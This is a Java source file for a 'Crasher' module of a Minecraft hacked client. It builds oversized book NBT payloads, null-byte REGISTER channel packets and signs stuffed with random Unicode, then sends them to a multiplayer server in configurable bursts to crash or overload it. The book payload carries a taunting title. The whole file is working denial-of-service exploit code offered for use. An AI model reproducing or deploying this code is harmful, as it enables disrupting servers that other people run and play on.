package me.chloe.dactyl.module.impl.client;

import io.netty.buffer.Unpooled;
import me.chloe.dactyl.event.impl.player.EventUpdateWalkingPlayer;
import me.chloe.dactyl.setting.Setting;
import me.chloe.dactyl.util.TimeUtil;
import me.chloe.dactyl.module.Module;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiDownloadTerrain;
import net.minecraft.entity.item.EntityItemFrame;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.inventory.EntityEquipmentSlot;
import net.minecraft.item.Item;
import net.minecraft.item.ItemArmor;
import net.minecraft.item.ItemElytra;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.util.EnumHand;
import net.minecraft.util.text.ITextComponent;
import net.minecraft.util.text.TextComponentString;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;


public class Crasher extends Module {

    public Setting<Integer> packets = new Setting<Integer>("Packets", 4, 1, 200);
    public Setting<Mode> mode = new Setting<Mode>("Mode", Mode.SIGN);
    public Setting<Double> delay = new Setting<Double>("Delay", 0d, 0d, 5d);
    boolean register = false;
    PacketBuffer buffer;
    private TimeUtil timer = new TimeUtil();
    private ItemStack book;

    public Crasher() {
        super("Crasher", Category.CLIENT);
    }

    @Override
    public void onEnable() {
        if (mode.getValue() == Mode.BOOK) {
            if (mc.player != null) {
                book = new ItemStack(Items.WRITABLE_BOOK);
                NBTTagList list = new NBTTagList();
                NBTTagCompound tag = new NBTTagCompound();
                //IntStream chars = new Random().ints(0x80, 0x10FFFF - 0x800).map(c -> c < 0xd800 ? c : c + 0x800);
                //String size = chars.limit(210*50).mapToObj(c -> String.valueOf((char) c)).collect(Collectors.joining());
                String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                for (int b = 0; b < 50; b++) {
                    NBTTagString tString = new NBTTagString(size);
                    list.appendTag(tString);
                }
                tag.setString("author", "Robeartt");
                tag.setString("title", "Raion on top don't ban me hause <3");
                tag.setTag("pages", list);
                book.setTagInfo("pages", list);
                book.setTagCompound(tag);
            }
        }
        else if (mode.getValue() == Mode.BOOKTWO) {
            book = new ItemStack(Items.WRITABLE_BOOK);
            NBTTagList list = new NBTTagList();
            NBTTagCompound tag = new NBTTagCompound();
            Random random = new Random();
            byte[] yeah = new byte[2560];
            random.nextBytes(yeah);
            String largeString = new String(yeah);

            for (int b = 0; b < (Integer.MAX_VALUE / 2); b++) {
                NBTTagString tString = new NBTTagString(largeString);
                list.appendTag(tString);
            }
            tag.setString("author", "Robeartt");
            tag.setString("title", "Raion on top don't ban me hause <3");
            tag.setTag("pages", list);
            book.setTagInfo("pages", list);
            book.setTagCompound(tag);
        }
    }

    @SubscribeEvent
    public void onUpdate(EventUpdateWalkingPlayer event) {
        if (mc.world == null || mc.currentScreen instanceof GuiDownloadTerrain || mc.currentScreen instanceof GuiDisconnected) {
            System.out.println("" + (mc.world == null) + "," + (mc.currentScreen instanceof GuiDownloadTerrain) + "," + (mc.currentScreen instanceof GuiDisconnected));
            toggle();
            return;
        }
        if (timer.hasPassed((long) (delay.getValue() * 1000))) {
            for (int i = 0; i < packets.getValue(); i++) {
                try {
                    if (mode.getValue() == Mode.BOOK || mode.getValue() == Mode.BOOKTWO) {
                        mc.getConnection()
                                .sendPacket(new CPacketClickWindow(mc.player.inventoryContainer.windowId, 0, 0, ClickType.PICKUP, book, mc.player.openContainer
                                        .getNextTransactionID(mc.player.inventory)));
                    }
                    else if (mode.getValue() == Mode.REGISTER) {
                        //if (register) {
                        if (buffer == null) {
                            buffer = new PacketBuffer(Unpooled.buffer());
                            for (int i2 = 0; i < 32767 / 4; i++) {
                                buffer.writeByte('\u0000');
                            }
                        }
                        mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", buffer));
                        register = false;
                        //} else {
                        //	byte[] buff = StringsKt.repeat("\u0000", 120).getBytes(Charsets.UTF_8);
                        //	PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
                        //	buffer.writeBytes(buff);
                        //	mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", buffer));
                        //	register = true;
                        //}
                    }
                    else if (mode.getValue() == Mode.SIGN) {
                        String[] lines = new String[4];
                        final IntStream gen = new Random().ints(0x80, 0x10ffff - 0x800)
                                .map(c -> c < 0xd800 ? c : c + 0x800);
                        final String line = gen.limit(4 * 384)
                                .mapToObj(c -> String.valueOf((char) c))
                                .collect(Collectors.joining());
                        for (int c = 0; c < 4; c++) {
                            lines[c] = line.substring(c * 384, (c + 1) * 384);
                        }
                        mc.getConnection().sendPacket(new CPacketUpdateSign(
                                mc.objectMouseOver.getBlockPos(),
                                new ITextComponent[]{
                                        new TextComponentString(lines[0]),
                                        new TextComponentString(lines[1]),
                                        new TextComponentString(lines[2]),
                                        new TextComponentString(lines[3])
                                }
                        ));
                    }
                    else if (mode.getValue() == Mode.TEST) {
                        mc.getConnection().sendPacket(new CPacketPlayerTryUseItem(EnumHand.MAIN_HAND));
                    }
                    else if (mode.getValue() == Mode.ARMOR) {
                        Item chest = mc.player.getItemStackFromSlot(EntityEquipmentSlot.CHEST).getItem();

                        if (chest == Items.AIR) {
                            int slot = findArmorSlot(EntityEquipmentSlot.CHEST);
                            if (slot != -1) equiqArmor(slot);
                        }
                        else {
                            mc.playerController.windowClick(mc.player.inventoryContainer.windowId, 6, 0, ClickType.QUICK_MOVE, mc.player);
                        }

                    }
                }
                catch (Throwable e) {
                    e.printStackTrace();
                    toggle();
                    return;
                }
            }
            timer.reset();
        }
    }

    private void equiqArmor(int slot) {
        mc.playerController.windowClick(mc.player.inventoryContainer.windowId, slot, 0, ClickType.QUICK_MOVE, mc.player);
        mc.playerController.updateController();
        timer.reset();
    }

    private int findArmorSlot(EntityEquipmentSlot type) {
        int slot = -1;
        for (int i = 9; i < 45; i++) {
            ItemStack item = mc.player.inventoryContainer.getSlot(i).getStack();
            if (item.getItem() instanceof ItemArmor) {
                ItemArmor armor = (ItemArmor) item.getItem();
                if (armor.armorType == type) {
                    slot = i;
                }
            }
            else if (item.getItem() instanceof ItemElytra) {
                slot = i;
            }
        }
        return slot;
    }

    private EntityItemFrame createFrame() {
        EntityItemFrame entity = new EntityItemFrame(mc.world, mc.objectMouseOver.getBlockPos(), mc.objectMouseOver.sideHit);
        NBTTagCompound tag = new NBTTagCompound();
        entity.setDisplayedItem(mc.player.getHeldItemMainhand());
        entity.writeEntityToNBT(tag);
        return entity;
    }

    private enum Mode {
        SIGN,
        BOOK,
        BOOKTWO,
        REGISTER,
        TEST,
        ARMOR;
    }
}